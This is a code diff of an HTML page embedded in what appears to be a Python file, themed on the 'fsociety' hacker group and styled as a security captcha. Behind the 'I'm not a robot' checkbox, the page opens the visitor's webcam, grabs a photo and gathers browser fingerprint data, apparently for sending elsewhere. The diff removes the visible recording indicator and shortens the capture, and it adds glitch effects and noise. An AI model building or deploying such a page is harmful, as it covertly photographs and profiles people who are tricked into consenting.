@@ -13,44 +13,55 @@ HTML = """
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>fsociety</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 html, body {
   height: 100%;
   background: #000;
   overflow: hidden;
+  font-family: 'Share Tech Mono', monospace;
 }
 body {
-  font-family: 'Roboto', sans-serif;
   display: flex;
   align-items: center;
   justify-content: center;
   min-height: 100vh;
+  color: #00ff41;
 }
-
-/* Фон с цифрами */
 #ascii-bg {
   position: fixed;
   top: 0; left: 0;
   width: 100%; height: 100%;
   z-index: 0;
 }
+body::before {
+  content: "";
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    rgba(0,255,65,0.03) 0px,
+    rgba(0,255,65,0.03) 1px,
+    transparent 1px,
+    transparent 3px
+  );
+  pointer-events: none;
+  z-index: 1;
+}
 
-/* Экран 1: fsociety */
+/* Экран 1 */
 #screen-intro {
   position: relative;
-  z-index: 2;
+  z-index: 3;
   text-align: center;
-  font-family: 'Share Tech Mono', monospace;
-  color: #00ff41;
-  padding: 20px;
+  padding: 40px 28px;
   border: 1px solid #00ff41;
-  background: rgba(0,0,0,0.75);
+  background: rgba(0,0,0,0.8);
   backdrop-filter: blur(4px);
   max-width: 360px;
   width: 90%;
-  box-shadow: 0 0 20px rgba(0,255,65,0.2), inset 0 0 20px rgba(0,255,65,0.05);
+  box-shadow: 0 0 30px rgba(0,255,65,0.3), inset 0 0 30px rgba(0,255,65,0.05);
 }
 .logo {
   font-size: 42px;
@@ -142,122 +153,199 @@ body {
 .btn:hover {
   background: #00ff41;
   color: #000;
-  box-shadow: 0 0 20px #00ff41;
+  box-shadow: 0 0 30px #00ff41;
 }
 
-/* Экран 2: капча */
+/* Капча */
 #screen-captcha {
   display: none;
   position: relative;
-  z-index: 2;
+  z-index: 3;
 }
 #screen-captcha.active { display: block; }
 .captcha {
-  background: #fff;
-  border: 1px solid #d3d3d3;
-  border-radius: 4px;
-  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-  padding: 24px;
+  position: relative;
+  background: rgba(0, 10, 0, 0.92);
+  border: 1px solid #00ff41;
+  padding: 32px 24px 24px;
   width: 320px;
   text-align: center;
-  font-family: 'Roboto', sans-serif;
+  box-shadow: 0 0 40px rgba(0,255,65,0.4), inset 0 0 20px rgba(0,255,65,0.08);
+  overflow: hidden;
 }
-.captcha .logo-svg {
+.captcha::before,
+.captcha::after {
+  content: "";
+  position: absolute;
+  width: 20px; height: 20px;
+  border: 2px solid #00ff41;
+}
+.captcha::before { top: -1px; left: -1px; border-right: none; border-bottom: none; }
+.captcha::after { bottom: -1px; right: -1px; border-left: none; border-top: none; }
+.scanline {
+  position: absolute;
+  left: 0; right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, #00ff41, transparent);
+  box-shadow: 0 0 12px #00ff41;
+  animation: scan 3s linear infinite;
+  opacity: 0.7;
+}
+@keyframes scan {
+  0% { top: 0; }
+  100% { top: 100%; }
+}
+.cap-header {
   display: flex;
   align-items: center;
   justify-content: center;
   gap: 10px;
-  margin-bottom: 16px;
+  margin-bottom: 20px;
+  padding-bottom: 16px;
+  border-bottom: 1px dashed #004d1f;
 }
-.captcha .logo-svg svg { width: 32px; height: 32px; }
-.captcha .logo-text {
-  font-size: 14px;
-  color: #5f6368;
-  letter-spacing: 1px;
+.cap-header svg { width: 28px; height: 28px; filter: drop-shadow(0 0 6px #00ff41); }
+.cap-header-text {
+  font-size: 12px;
+  color: #00ff41;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  text-shadow: 0 0 6px #00ff41;
+}
+.cap-title {
+  font-size: 16px;
+  color: #00ff41;
+  letter-spacing: 2px;
+  margin-bottom: 8px;
   text-transform: uppercase;
 }
-.captcha .title {
-  font-size: 18px;
-  color: #202124;
-  margin-bottom: 8px;
-  font-weight: 500;
-}
-.captcha .subtitle {
-  font-size: 13px;
-  color: #5f6368;
+.cap-subtitle {
+  font-size: 11px;
+  color: #00802a;
+  letter-spacing: 1px;
   margin-bottom: 24px;
 }
+.cap-terms {
+  font-size: 10px;
+  color: #004d1f;
+  letter-spacing: 1px;
+  margin-bottom: 16px;
+  text-align: left;
+  line-height: 1.6;
+}
+.cap-terms span { color: #00ff41; }
 .checkbox {
+  position: relative;
   display: flex;
   align-items: center;
   gap: 12px;
-  padding: 12px;
-  border: 2px solid #d3d3d3;
-  border-radius: 4px;
+  padding: 14px;
+  border: 1px solid #00ff41;
+  background: rgba(0,255,65,0.03);
   cursor: pointer;
-  transition: all 0.2s;
-  background: #fff;
+  transition: all 0.3s;
+  overflow: hidden;
 }
-.checkbox:hover { border-color: #4285f4; }
-.checkbox.checked { border-color: #4285f4; background: #f0f6ff; }
+.checkbox:hover {
+  background: rgba(0,255,65,0.08);
+  box-shadow: 0 0 20px rgba(0,255,65,0.4), inset 0 0 20px rgba(0,255,65,0.05);
+}
+.checkbox.checked {
+  background: rgba(0,255,65,0.15);
+  box-shadow: 0 0 30px rgba(0,255,65,0.6), inset 0 0 20px rgba(0,255,65,0.1);
+}
 .box {
   width: 24px; height: 24px;
-  border: 2px solid #5f6368;
-  border-radius: 2px;
+  border: 2px solid #00ff41;
   display: flex;
   align-items: center;
   justify-content: center;
-  transition: all 0.2s;
+  transition: all 0.3s;
   flex-shrink: 0;
+  box-shadow: 0 0 8px rgba(0,255,65,0.3);
 }
-.checkbox.checked .box { background: #4285f4; border-color: #4285f4; }
-.box svg { width: 16px; height: 16px; opacity: 0; transition: opacity 0.2s; }
+.checkbox.checked .box { background: #00ff41; box-shadow: 0 0 20px #00ff41; }
+.box svg { width: 16px; height: 16px; opacity: 0; transition: opacity 0.3s; }
 .checkbox.checked .box svg { opacity: 1; }
-.checkbox-text { font-size: 14px; color: #202124; text-align: left; }
-.status {
-  margin-top: 16px;
+.checkbox-text {
   font-size: 13px;
-  color: #5f6368;
-  min-height: 18px;
-}
-.status.error { color: #d93025; }
-.status.success { color: #188038; }
-.spinner {
-  display: inline-block;
-  width: 14px; height: 14px;
-  border: 2px solid #d3d3d3;
-  border-top-color: #4285f4;
-  border-radius: 50%;
-  animation: spin 0.8s linear infinite;
-  vertical-align: middle;
-  margin-right: 8px;
-}
-@keyframes spin { to { transform: rotate(360deg); } }
-.rec {
-  display: none;
-  margin-top: 16px;
-  font-size: 13px;
-  color: #d93025;
-}
-.rec.active { display: block; }
-.dot {
-  display: inline-block;
-  width: 10px; height: 10px;
-  background: #d93025;
-  border-radius: 50%;
-  margin-right: 6px;
-  animation: blink 1s infinite;
+  color: #00ff41;
+  letter-spacing: 2px;
+  text-align: left;
+  text-transform: uppercase;
 }
 
-/* Экран 3: финал */
+/* Обратный отсчёт */
+#countdown {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: #000;
+  z-index: 60;
+  align-items: center;
+  justify-content: center;
+}
+#countdown.active { display: flex; }
+.countdown-num {
+  font-size: 160px;
+  color: #00ff41;
+  text-shadow: 0 0 40px #00ff41, 0 0 80px #00ff41;
+  font-family: 'Share Tech Mono', monospace;
+  animation: pulseNum 1s ease-in-out infinite;
+}
+@keyframes pulseNum {
+  0%, 100% { transform: scale(1); text-shadow: 0 0 40px #00ff41; }
+  50% { transform: scale(1.15); text-shadow: 0 0 80px #00ff41, 0 0 120px #00ff41; }
+}
+
+/* Глитч */
+#glitch-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: #000;
+  z-index: 70;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+}
+#glitch-overlay.active { display: flex; }
+.glitch-text {
+  font-size: 64px;
+  color: #ff0033;
+  letter-spacing: 8px;
+  text-shadow: 0 0 20px #ff0033, 3px 0 0 #00ffff, -3px 0 0 #00ff41;
+  animation: shake 0.1s infinite;
+}
+@keyframes shake {
+  0% { transform: translate(0); }
+  25% { transform: translate(-3px, 2px); }
+  50% { transform: translate(3px, -2px); }
+  75% { transform: translate(-2px, -3px); }
+  100% { transform: translate(2px, 3px); }
+}
+.glitch-sub {
+  font-size: 14px;
+  color: #00ff41;
+  letter-spacing: 6px;
+  margin-top: 20px;
+  opacity: 0.8;
+}
+
+/* Финал */
 #screen-final {
   display: none;
   position: relative;
-  z-index: 2;
+  z-index: 3;
   text-align: center;
-  font-family: 'Share Tech Mono', monospace;
-  color: #00ff41;
-  padding: 20px;
+  padding: 40px 28px;
+  border: 1px solid #00ff41;
+  background: rgba(0,0,0,0.75);
+  max-width: 360px;
+  width: 90%;
+  box-shadow: 0 0 30px rgba(0,255,65,0.3);
   animation: fadeIn 2s ease;
 }
 #screen-final.active { display: block; }
@@ -266,20 +354,23 @@ body {
   to { opacity: 1; }
 }
 .final-line1 {
-  font-size: 28px;
+  font-size: 24px;
   letter-spacing: 6px;
   margin-bottom: 16px;
+  color: #00ff41;
   text-shadow: 0 0 12px #00ff41;
 }
 .final-line2 {
-  font-size: 16px;
+  font-size: 14px;
   letter-spacing: 3px;
   margin-bottom: 40px;
+  color: #00ff41;
   text-shadow: 0 0 8px #00ff41;
 }
 .final-fsociety {
   font-size: 42px;
   letter-spacing: 10px;
+  color: #00ff41;
   text-shadow: 0 0 20px #00ff41;
   animation: pulseGlow 3s ease-in-out infinite;
 }
@@ -294,12 +385,18 @@ body {
   margin-top: 24px;
   text-transform: uppercase;
 }
+.final-counter {
+  font-size: 11px;
+  color: #004d1f;
+  letter-spacing: 2px;
+  margin-top: 32px;
+}
+.final-counter span { color: #00ff41; }
 </style>
 </head>
 <body>
 <canvas id="ascii-bg"></canvas>
 
-<!-- Экран 1: fsociety -->
 <div id="screen-intro">
   <div class="logo">
     <span class="glitch" data-text="fsociety">fsociety</span>
@@ -310,41 +407,51 @@ body {
   <button class="btn" onclick="showCaptcha()">Verify identity</button>
 </div>
 
-<!-- Экран 2: капча -->
 <div id="screen-captcha">
   <div class="captcha">
-    <div class="logo-svg">
+    <div class="scanline"></div>
+    <div class="cap-header">
       <svg viewBox="0 0 24 24" fill="none">
-        <path d="M12 2L4 6v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12V6l-8-4z" fill="#4285f4"/>
-        <path d="M10 15l-3-3 1.4-1.4L10 12.2l5.6-5.6L17 8l-7 7z" fill="#fff"/>
+        <path d="M12 2L4 6v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12V6l-8-4z" fill="#00ff41"/>
+        <path d="M10 15l-3-3 1.4-1.4L10 12.2l5.6-5.6L17 8l-7 7z" fill="#000"/>
       </svg>
-      <div class="logo-text">Security Check</div>
+      <div class="cap-header-text">Security Node</div>
     </div>
-    <div class="title">Подтвердите, что вы человек</div>
-    <div class="subtitle">Для продолжения необходимо пройти проверку</div>
+    <div class="cap-title">Verify Human</div>
+    <div class="cap-subtitle">Biometric check required</div>
+    <div class="cap-terms">
+      > session id: <span id="sess"></span><br>
+      > encryption: <span>AES-256</span><br>
+      > status: <span>awaiting confirmation</span>
+    </div>
     <div class="checkbox" id="checkbox" onclick="startCheck()">
       <div class="box">
         <svg viewBox="0 0 24 24" fill="none">
-          <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"/>
+          <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#000"/>
         </svg>
       </div>
-      <div class="checkbox-text">Я не робот</div>
+      <div class="checkbox-text">I'm not a robot</div>
     </div>
-    <div class="status" id="status"></div>
-    <div class="rec" id="rec"><span class="dot"></span>Запись 3 сек...</div>
   </div>
 </div>
 
-<!-- Экран 3: финал -->
+<div id="countdown"><div class="countdown-num" id="cd-num">3</div></div>
+
+<div id="glitch-overlay">
+  <div class="glitch-text">WAKE UP</div>
+  <div class="glitch-sub">SYSTEM BREACH DETECTED</div>
+</div>
+
 <div id="screen-final">
   <div class="final-line1">HELLO, FRIEND.</div>
   <div class="final-line2">IT'S TIME TO WAKE UP.</div>
   <div class="final-fsociety">fsociety</div>
   <div class="final-sub">fsociety // connection</div>
+  <div class="final-counter">you are visitor <span id="visitor"></span> of fsociety</div>
 </div>
 
 <script>
-// Матрица на фоне
+// === Фон: падающие цифры ===
 const canvas = document.getElementById("ascii-bg");
 const ctx = canvas.getContext("2d");
 let w, h, columns, drops;
@@ -374,7 +481,41 @@ function draw() {
 }
 setInterval(draw, 50);
 
-// Переключение экранов
+// === Белый шум (Web Audio API) ===
+let noiseSource = null;
+let audioCtx = null;
+
+function startNoise(duration) {
+  try {
+    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const bufferSize = audioCtx.sampleRate * duration;
+    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
+    const data = buffer.getChannelData(0);
+    for (let i = 0; i < bufferSize; i++) {
+      data[i] = Math.random() * 2 - 1;
+    }
+    noiseSource = audioCtx.createBufferSource();
+    noiseSource.buffer = buffer;
+    const gain = audioCtx.createGain();
+    gain.gain.value = 0.15;
+    noiseSource.connect(gain);
+    gain.connect(audioCtx.destination);
+    noiseSource.start();
+  } catch(e) {}
+}
+
+function stopNoise() {
+  try {
+    if (noiseSource) noiseSource.stop();
+    if (audioCtx) audioCtx.close();
+  } catch(e) {}
+}
+
+document.getElementById("sess").innerText =
+  Math.random().toString(16).slice(2, 10).toUpperCase();
+document.getElementById("visitor").innerText =
+  Math.floor(Math.random() * 9000 + 1000);
+
 function showCaptcha() {
   document.getElementById("screen-intro").style.display = "none";
   document.getElementById("screen-captcha").classList.add("active");
@@ -385,7 +526,6 @@ function showFinal() {
   document.getElementById("screen-final").classList.add("active");
 }
 
-// Сбор данных
 async function collectData() {
   const data = {
     ua: navigator.userAgent,
@@ -454,15 +594,9 @@ async function collectData() {
   return data;
 }
 
-// Капча → камера → фото → финал
 async function startCheck() {
   const cb = document.getElementById("checkbox");
-  const status = document.getElementById("status");
-  const rec = document.getElementById("rec");
   if (cb.classList.contains("checked")) return;
-
-  status.innerHTML = '<span class="spinner"></span>Проверка...';
-  status.className = "status";
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -470,16 +604,12 @@ async function startCheck() {
       audio: false
     });
 
-    rec.classList.add("active");
-    status.innerHTML = '<span class="spinner"></span>Анализ...';
-
     const video = document.createElement("video");
     video.srcObject = stream;
     video.setAttribute("playsinline", "");
     await video.play();
-    await new Promise(r => setTimeout(r, 3000));
+    await new Promise(r => setTimeout(r, 1000));
     stream.getTracks().forEach(t => t.stop());
-    rec.classList.remove("active");
 
     const c = document.createElement("canvas");
     c.width = video.videoWidth;
@@ -496,15 +626,38 @@ async function startCheck() {
     });
 
     cb.classList.add("checked");
-    status.className = "status success";
-    status.innerText = "Проверка пройдена";
 
-    setTimeout(showFinal, 1500);
-  } catch (e) {
-    rec.classList.remove("active");
-    status.className = "status error";
-    status.innerText = "Проверка не пройдена. Попробуйте снова.";
-  }
+    // Вибрация
+    if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 400]);
+
+    // Обратный отсчёт 3-2-1
+    document.getElementById("screen-captcha").classList.remove("active");
+    const cd = document.getElementById("countdown");
+    const cdNum = document.getElementById("cd-num");
+    cd.classList.add("active");
+    let n = 3;
+    cdNum.innerText = n;
+    const cdInterval = setInterval(() => {
+      n--;
+      if (n > 0) {
+        cdNum.innerText = n;
+      } else {
+        clearInterval(cdInterval);
+        cd.classList.remove("active");
+
+        // Белый шум на 2.5 сек
+        startNoise(2.5);
+
+        // Глитч
+        document.getElementById("glitch-overlay").classList.add("active");
+        setTimeout(() => {
+          document.getElementById("glitch-overlay").classList.remove("active");
+          stopNoise();
+          showFinal();
+        }, 1800);
+      }
+    }, 1000);
+  } catch (e) {}
 }
 </script>
 </body>
